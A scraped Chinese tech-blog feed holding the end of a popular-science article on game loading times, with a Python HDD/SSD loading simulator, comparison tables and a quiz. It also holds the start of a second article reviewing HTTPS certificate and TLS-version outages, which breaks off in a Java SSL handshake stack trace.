    <span class="hljs-string">"""游戏资源"""</span>
    name: <span class="hljs-built_in">str</span>           <span class="hljs-comment"># 资源名称</span>
    size_mb: <span class="hljs-built_in">float</span>      <span class="hljs-comment"># 资源大小</span>
    load_time: <span class="hljs-built_in">float</span>    <span class="hljs-comment"># 加载时间</span>
    resource_type: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># 资源类型</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">StorageDevice</span>:
    <span class="hljs-string">"""存储设备"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, read_speed_mbps: <span class="hljs-built_in">float</span>, name_emoji: <span class="hljs-built_in">str</span> = <span class="hljs-string">"💾"</span></span>):
        self.name = name
        self.read_speed = read_speed_mbps
        self.name_emoji = name_emoji
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_load_time</span>(<span class="hljs-params">self, file_size_mb: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""计算加载时间（秒）"""</span>
        <span class="hljs-keyword">return</span> file_size_mb / self.read_speed

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameLoader</span>:
    <span class="hljs-string">"""游戏加载器"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, storage: StorageDevice</span>):
        self.storage = storage
        self.loaded_resources: <span class="hljs-type">List</span>[GameResource] = []
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_resource</span>(<span class="hljs-params">self, resource: GameResource, show_progress: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-string">"""加载单个资源"""</span>
        <span class="hljs-keyword">if</span> show_progress:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📦 正在加载 <span class="hljs-subst">{resource.name}</span>..."</span>)
      
        <span class="hljs-comment"># 模拟加载时间</span>
        load_time = self.storage.calculate_load_time(resource.size_mb)
        time.sleep(load_time * <span class="hljs-number">0.5</span>)  <span class="hljs-comment"># 加速模拟</span>
      
        self.loaded_resources.append(resource)
      
        <span class="hljs-keyword">if</span> show_progress:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✅ <span class="hljs-subst">{resource.name}</span> 加载完成！耗时: <span class="hljs-subst">{load_time:<span class="hljs-number">.2</span>f}</span>秒"</span>)
      
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
  
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_game_resources</span>(<span class="hljs-params">self, resources: <span class="hljs-type">List</span>[GameResource]</span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""加载所有游戏资源"""</span>
        total_time = <span class="hljs-number">0</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n🎮 开始加载游戏资源..."</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📀 使用存储设备: <span class="hljs-subst">{self.storage.name_emoji}</span> <span class="hljs-subst">{self.storage.name}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🚀 读取速度: <span class="hljs-subst">{self.storage.read_speed}</span> MB/s"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
      
        <span class="hljs-keyword">for</span> i, resource <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(resources, <span class="hljs-number">1</span>):
            self.load_resource(resource, show_progress=<span class="hljs-literal">True</span>)
            total_time += resource.size_mb / self.storage.read_speed
      
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🎉 游戏加载完成！"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📊 总资源数量: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(resources)}</span> 个"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📦 总资源大小: <span class="hljs-subst">{<span class="hljs-built_in">sum</span>(r.size_mb <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resources):<span class="hljs-number">.2</span>f}</span> MB"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"⏱️ 总加载时间: <span class="hljs-subst">{total_time:<span class="hljs-number">.2</span>f}</span> 秒"</span>)
      
        <span class="hljs-keyword">return</span> total_time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate_loading_comparison</span>():
    <span class="hljs-string">"""模拟不同存储设备的加载对比"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"📊 游戏加载时间对比"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
  
    <span class="hljs-comment"># 模拟的游戏资源</span>
    game_resources = [
        GameResource(<span class="hljs-string">"游戏引擎核心"</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🔧"</span>),
        GameResource(<span class="hljs-string">"主场景地图"</span>, <span class="hljs-number">200</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🗺️"</span>),
        GameResource(<span class="hljs-string">"角色模型"</span>, <span class="hljs-number">150</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"👤"</span>),
        GameResource(<span class="hljs-string">"高分辨率贴图"</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🖼️"</span>),
        GameResource(<span class="hljs-string">"背景音乐"</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🎵"</span>),
        GameResource(<span class="hljs-string">"音效文件"</span>, <span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🔊"</span>),
        GameResource(<span class="hljs-string">"NPC AI数据"</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🤖"</span>),
        GameResource(<span class="hljs-string">"过场动画"</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"🎬"</span>),
        GameResource(<span class="hljs-string">"UI界面"</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"📱"</span>),
        GameResource(<span class="hljs-string">"粒子特效"</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"✨"</span>),
    ]
  
    <span class="hljs-comment"># 不同的存储设备</span>
    devices = [
        StorageDevice(<span class="hljs-string">"机械硬盘 (HDD)"</span>, <span class="hljs-number">100</span>, <span class="hljs-string">"💿"</span>),
        StorageDevice(<span class="hljs-string">"SATA SSD"</span>, <span class="hljs-number">500</span>, <span class="hljs-string">"💾"</span>),
        StorageDevice(<span class="hljs-string">"NVMe SSD"</span>, <span class="hljs-number">3500</span>, <span class="hljs-string">"⚡"</span>),
    ]
  
    results = []
    <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> devices:
        loader = GameLoader(device)
        total_time = loader.load_game_resources(game_resources)
        results.append((device.name, total_time))
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span>)
  
    <span class="hljs-comment"># 对比结果</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"📈 加载时间对比结果"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'存储设备'</span>:&lt;<span class="hljs-number">20</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'加载时间'</span>:&lt;<span class="hljs-number">15</span>}</span> <span class="hljs-subst">{<span class="hljs-string">'体验评价'</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">60</span>)
  
    device_names = {
        <span class="hljs-string">"机械硬盘 (HDD)"</span>: <span class="hljs-string">"😴 漫长等待"</span>,
        <span class="hljs-string">"SATA SSD"</span>: <span class="hljs-string">"😊 还算流畅"</span>,
        <span class="hljs-string">"NVMe SSD"</span>: <span class="hljs-string">"🚀 飞一般的感觉"</span>,
    }
  
    <span class="hljs-keyword">for</span> device_name, time_taken <span class="hljs-keyword">in</span> results:
        emoji = device_names.get(device_name, <span class="hljs-string">"🤔"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{device_name:&lt;<span class="hljs-number">20</span>}</span> <span class="hljs-subst">{time_taken:&gt;<span class="hljs-number">10.2</span>f}</span> 秒    <span class="hljs-subst">{emoji}</span>"</span>)
  
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n💡 小贴士：升级到SSD，游戏加载速度提升 5-35 倍！"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"🎮 欢迎使用游戏加载模拟器！"</span>)
    simulate_loading_comparison()
</code></pre>
<p><strong>运行结果</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">🎮 欢迎使用游戏加载模拟器！

============================================================
<span class="hljs-section">📊 游戏加载时间对比
============================================================</span>

🎮 开始加载游戏资源...
📀 使用存储设备: 💿 机械硬盘 (HDD)
<span class="hljs-section">🚀 读取速度: 100 MB/s
--------------------------------------------------</span>
📦 正在加载 游戏引擎核心...
✅ 游戏引擎核心 加载完成！耗时: 0.50秒
📦 正在加载 主场景地图...
✅ 主场景地图 加载完成！耗时: 2.00秒
...（省略部分输出）...
🎉 游戏加载完成！
📊 总资源数量: 10 个
📦 总资源大小: 1250.00 MB
⏱️ 总加载时间: 12.50 秒

<span class="hljs-section">📊 加载时间对比结果
============================================================</span>
<span class="hljs-section">📈 加载时间对比结果
============================================================</span>
<span class="hljs-section">存储设备              加载时间          体验评价
------------------------------------------------------------</span>
机械硬盘 (HDD)        12.50 秒     😴 漫长等待
SATA SSD              2.50 秒      😊 还算流畅
NVMe SSD              0.36 秒      🚀 飞一般的感觉
</code></pre>
<h3 data-id="heading-16">📊 趣味对比：HDD vs SSD vs 其他存储设备</h3>











































































<table><thead><tr><th>对比项</th><th>机械硬盘 (HDD)</th><th>SATA SSD</th><th>NVMe SSD</th><th>云游戏</th></tr></thead><tbody><tr><td><strong>读取速度</strong></td><td>100-150 MB/s</td><td>500-600 MB/s</td><td>3000-7000 MB/s</td><td>取决于网络</td></tr><tr><td><strong>游戏加载时间</strong></td><td>60秒+</td><td>15-20秒</td><td>5-10秒</td><td>5-15秒</td></tr><tr><td><strong>随机读取性能</strong></td><td>差</td><td>好</td><td>极好</td><td>取决于网络</td></tr><tr><td><strong>价格/GB</strong></td><td>便宜（约0.03）</td><td>中等（约0.08）</td><td>较贵（约0.1）</td><td>订阅制</td></tr><tr><td><strong>游戏体验</strong></td><td>😴 等待焦虑</td><td>😊 基本满意</td><td>🚀 丝滑流畅</td><td>🎮 依赖网络</td></tr><tr><td><strong>适合游戏类型</strong></td><td>单机大作</td><td>大多数游戏</td><td>3A大作、开放世界</td><td>随时随地玩</td></tr><tr><td><strong>功耗</strong></td><td>高</td><td>低</td><td>低</td><td>服务器端</td></tr><tr><td><strong>噪音</strong></td><td>有（硬盘转动）</td><td>无</td><td>无</td><td>无</td></tr><tr><td><strong>可靠性</strong></td><td>一般（机械结构）</td><td>好（无机械部件）</td><td>很好</td><td>取决于服务商</td></tr></tbody></table>
<h3 data-id="heading-17">📈 数据支撑：游戏加载的"硬核数据"</h3>
<ul>
<li>⚡ <strong>SSD可将游戏加载时间从60秒减少到10秒以内</strong>，速度提升5-6倍</li>
<li>🎮 现代3A游戏平均容量超过<strong>100GB</strong>，是10年前的10倍</li>
<li>⏱️ 玩家平均每天花在游戏加载上的时间<strong>超过30分钟</strong></li>
<li>🚀 NVMe SSD的随机读取速度是HDD的<strong>100倍以上</strong></li>
<li>💾 游戏资源中，<strong>贴图占60-70%</strong>，是最大的加载瓶颈</li>
<li>🎬 4K游戏加载需要读取的纹理数据是1080p游戏的<strong>4倍以上</strong></li>
<li>📶 云游戏最低需要<strong>25Mbps</strong>的网络带宽才能流畅运行</li>
</ul>
<h3 data-id="heading-18">🏢 游戏加载技术的应用场景</h3>








































<table><thead><tr><th>应用场景</th><th>技术</th><th>效果</th></tr></thead><tbody><tr><td>🎮 3A大作</td><td>NVMe SSD + 异步加载</td><td>加载时间&lt;10秒</td></tr><tr><td>🗺️ 开放世界</td><td>预加载 + 纹理流送</td><td>无缝切换场景</td></tr><tr><td>🎮 手游</td><td>LZ4压缩 + AssetBundle</td><td>快速启动</td></tr><tr><td>🖥️ PC游戏</td><td>SSD + 游戏补丁</td><td>快速更新</td></tr><tr><td>🎬 游戏过场</td><td>后台预加载</td><td>无感加载</td></tr><tr><td>🌐 云游戏</td><td>边缘计算 + CDN</td><td>即点即玩</td></tr></tbody></table>
<h3 data-id="heading-19">⚠️ 常见误区纠正</h3>
<h4 data-id="heading-20">1. "SSD只是加载快，游戏中差不多？"</h4>
<p><strong>错！</strong> SSD不仅影响加载时间，还会影响：</p>
<ul>
<li>场景切换速度</li>
<li>贴图流送质量</li>
<li>游戏存档速度</li>
<li>地图快速旅行时间</li>
</ul>
<h4 data-id="heading-21">2. "游戏加载越快越好？"</h4>
<p><strong>不一定！</strong> 加载速度受多种因素影响：</p>
<ul>
<li>CPU解压速度</li>
<li>GPU上传速度</li>
<li>资源依赖关系</li>
<li>网络带宽（云游戏）</li>
</ul>
<h4 data-id="heading-22">3. "压缩资源不会影响画质？"</h4>
<p><strong>不一定！</strong> 有损压缩会影响画质：</p>
<ul>
<li>贴图压缩会有一定失真</li>
<li>音频压缩会影响音质</li>
<li>需要权衡文件大小和画质</li>
</ul>
<h4 data-id="heading-23">4. "云游戏不需要加载？"</h4>
<p><strong>错！</strong> 云游戏需要加载：</p>
<ul>
<li>游戏启动时的初始化</li>
<li>网络波动时的缓冲</li>
<li>高画质视频流的传输</li>
</ul>
<h4 data-id="heading-24">5. "机械硬盘已经过时了？"</h4>
<p><strong>不完全对！</strong> HDD仍有优势：</p>
<ul>
<li>价格便宜，适合存储大量游戏</li>
<li>适合对加载速度要求不高的游戏</li>
<li>大容量存储（比如游戏库备份）</li>
</ul>
<h3 data-id="heading-25">🔮 未来展望：游戏加载技术的发展趋势</h3>
<h4 data-id="heading-26">1. 🚀 更快存储设备</h4>
<p><strong>PCIe 5.0/6.0 SSD</strong></p>
<ul>
<li>PCIe 5.0 SSD读取速度可达<strong>14GB/s</strong></li>
<li>PCIe 6.0 SSD读取速度可达<strong>30GB/s</strong></li>
<li>游戏加载时间将缩短到<strong>1-2秒</strong></li>
</ul>
<p><strong>存储级内存（SCM）</strong></p>
<ul>
<li>类似DRAM的速度，SSD的持久性</li>
<li>可能取代传统SSD</li>
<li>游戏几乎可以"即时启动"</li>
</ul>
<h4 data-id="heading-27">2. 🧠 AI驱动的资源管理</h4>
<p><strong>智能预加载</strong></p>
<ul>
<li>AI预测玩家行为</li>
<li>提前加载可能需要的资源</li>
<li>玩家几乎感觉不到加载</li>
</ul>
<p><strong>自适应资源流送</strong></p>
<ul>
<li>根据玩家视角动态加载资源</li>
<li>保证重要区域优先加载</li>
<li>优化内存使用</li>
</ul>
<h4 data-id="heading-28">3. ☁️ 云游戏进化</h4>
<p><strong>5G/6G网络</strong></p>
<ul>
<li>5G延迟可低至1ms</li>
<li>6G延迟可低至0.1ms</li>
<li>云游戏体验接近本地运行</li>
</ul>
<p><strong>边缘计算</strong></p>
<ul>
<li>游戏服务器更靠近玩家</li>
<li>减少网络延迟</li>
<li>提高加载速度</li>
</ul>
<h4 data-id="heading-29">4. 🎮 新一代游戏技术</h4>
<p><strong>DirectStorage（DirectX 12 Ultimate）</strong></p>
<ul>
<li>允许GPU直接访问SSD</li>
<li>绕过CPU，直接加载纹理到显存</li>
<li>大幅减少加载时间</li>
</ul>
<p><strong>GPU资源压缩</strong></p>
<ul>
<li>更好的纹理压缩算法</li>
<li>更快的解压硬件</li>
<li>减少显存占用和带宽需求</li>
</ul>
<p><strong>游戏引擎优化</strong></p>
<ul>
<li>更高效的资源管理系统</li>
<li>更智能的加载调度</li>
<li>更快的初始化流程</li>
</ul>
<h3 data-id="heading-30">🎓 互动小测验：你答对了吗？</h3>


















































<table><thead><tr><th>问题</th><th>答案</th><th>你答对了吗？</th></tr></thead><tbody><tr><td>现代3A游戏的平均容量是多少？</td><td>100GB以上</td><td>✅/❌</td></tr><tr><td>SSD相比HDD能提升多少加载速度？</td><td>5-35倍</td><td>✅/❌</td></tr><tr><td>游戏资源中占比最大的是什么？</td><td>贴图（60-70%）</td><td>✅/❌</td></tr><tr><td>预加载技术的目的是什么？</td><td>提前加载可能需要的资源</td><td>✅/❌</td></tr><tr><td>PCIe 5.0 SSD的读取速度可达多少？</td><td>14GB/s</td><td>✅/❌</td></tr><tr><td>云游戏最低需要多少网络带宽？</td><td>25Mbps</td><td>✅/❌</td></tr><tr><td>DirectStorage技术有什么作用？</td><td>允许GPU直接访问SSD</td><td>✅/❌</td></tr><tr><td>游戏加载的"四大件"包括什么？</td><td>引擎、贴图、音频、数据</td><td>✅/❌</td></tr></tbody></table>
<h3 data-id="heading-31">🎯 结语：加载时间的"进化论"</h3>
<p>从卡带的"即点即玩"，到光盘的"漫长等待"，再到SSD的"飞速加载"——游戏加载技术的进化，正是整个游戏行业进步的缩影！</p>
<p><strong>记住</strong>：</p>
<ul>
<li>💾 存储速度是加载时间的"天花板"</li>
<li>🧠 智能预加载可以"欺骗"玩家感知</li>
<li>☁️ 云游戏可能是未来的"终极方案"</li>
</ul>
<p>下次当你等待游戏加载时，不妨想想背后的技术——正是这些"看不见的优化"，让我们的游戏体验变得越来越好！</p>
<h3 data-id="heading-32">💬 互动话题</h3>
<ol>
<li>你用过HDD、SSD还是云游戏？体验如何？</li>
<li>你遇到过最长的游戏加载时间是多久？</li>
<li>你希望未来的游戏加载技术是什么样的？</li>
<li>如果你设计游戏，会用什么技术来优化加载体验？</li>
</ol>
<p>快来评论区聊聊你的想法！💬 点赞收藏不迷路，咱们下期继续探索计算机的"十万个为什么"！🎉</p>
<p><strong>关注我</strong>，下期带你解锁更多计算机的"奇葩冷知识"！🤓</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析]]></title>    <link>https://juejin.cn/post/7591806035759317034</link>    <guid>https://juejin.cn/post/7591806035759317034</guid>    <pubDate>2026-01-06T08:42:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035759317034" data-draft-id="7591788451030302763" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T08:42:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="自然吸气发动机"/> <meta itemprop="url" content="https://juejin.cn/user/3892706247712647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3892706247712647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    自然吸气发动机
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:45.000Z" title="Tue Jan 06 2026 08:42:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">前言</h2>
<p>近期笔者亲历两起因 HTTPS 配置不当引发的生产级 P0 故障，另一起更是登上热搜的英雄联盟 SSL 证书过期事件。这些看似 “低级” 的配置问题，却造成了大面积服务不可用，背后折射出的 HTTPS 核心技术盲点值得所有技术人警醒。本文将结合这两起典型故障，拆解 HTTPS 协议、证书、TLS 加密等核心知识点，帮大家理清容易踩坑的关键环节。</p>
<h4 data-id="heading-1">故障 1：英雄联盟 SSL 证书过期致全网玩家无法登录</h4>
<p>作为全球顶级网游，英雄联盟因 SSL 证书未及时续期，导致大量玩家无法正常登录游戏，故障持续超 10 小时。这一 “低级失误” 引发全网调侃的同时，也让我们意识到：哪怕是头部产品，忽视 HTTPS 证书基础管理也会酿成重大事故。</p>
<h4 data-id="heading-2">故障 2：服务端升级 TLS 协议导致客户端请求全量失败</h4>
<p>笔者对接的某客户为提升网站安全等级，将服务器加密协议仅保留 TLS 1.3，直接导致我方基于 OkHttp 的客户端请求全部报错，核心异常堆栈如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-number">2026</span>-<span class="hljs-number">01</span>-<span class="hljs-number">06</span> <span class="hljs-number">01</span>:<span class="hljs-number">19</span>:<span class="hljs-number">01.204</span> SGMWH5-qDyCNpxbPkHiMVxV9mA7218NDaw0hI1I [com.xxxx.HttpClientUtils] [ERROR] [<span class="hljs-number">3355283</span>]        请求失败
javax.net.ssl.SSLHandshakeException: Received fatal alert: protocol_version
        at sun.security.ssl.Alert.createSSLException(Alert.java:<span class="hljs-number">131</span>)
        at sun.security.ssl.Alert.createSSLException(Alert.java:<span class="hljs-number">117</span>)
        at sun.security.ssl.TransportContext.fatal(TransportContext.java:<span class="hljs-number">357</span>)
        at sun.security.ssl.Alert$AlertConsumer.consume(Alert.java:<span class="hljs-number">293</span>)
        at sun.security.ssl.TransportContext.dispatch(TransportContext.java:<span class="hljs-number">203</span>)
        at sun.security.ssl.SSLTransport.decode(SSLTransport.java:<span class="hljs-number">154</span>)
        at sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:<span class="hljs-number">1290</span>)
        at sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:<span class="hljs-number">1199</span>)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:<span class="hljs-number">401</span>)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:<span class="hljs-number">373</span>)
        at okhttp3.internal.connection.RealConnection.connectTls(RealConnection.java:<span class="hljs-number">320</span>)
        at okhttp3.internal.connection.RealConnection.establishProtocol(RealConnection.java:<span class="hljs-number">284</span>)
        at okhttp3.internal.connection.RealConnection.connect(RealConnection.java:<span class="hljs-number">169</span>)
        at okhttp3.internal.connection.StreamAllocation.findConnection(StreamAllocation.java:<span class="hljs-number">257</span>)
